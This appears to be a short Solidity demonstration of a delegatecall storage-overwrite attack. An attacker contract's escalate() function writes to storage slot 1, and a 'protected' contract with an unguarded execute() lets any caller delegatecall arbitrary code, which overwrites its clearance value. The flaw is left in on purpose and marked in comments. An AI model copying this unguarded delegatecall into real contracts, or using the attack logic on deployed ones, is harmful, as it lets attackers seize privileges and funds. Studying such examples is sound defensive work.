// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

contract MACBypassLogic {
    // Attacker logic used in delegatecall
    function escalate() public returns (bool) {
        // Simulates malicious access escalation
        assembly {
            sstore(0x1, 0xdeadbeef) // overwrite "clearance" slot
        }
        return true;
    }
}

contract MACProtectedSystem {
    address public admin;
    uint256 public clearance; // slot 1: protected by MAC

    constructor() {
        admin = msg.sender;
        clearance = 1; // normal users start with low clearance
    }

    function execute(address logic) external {
        // 💣 Attacker passes malicious logic address
        logic.delegatecall(abi.encodeWithSignature("escalate()"));
    }

    function getClearance() external view returns (uint256) {
        return clearance;
    }
}
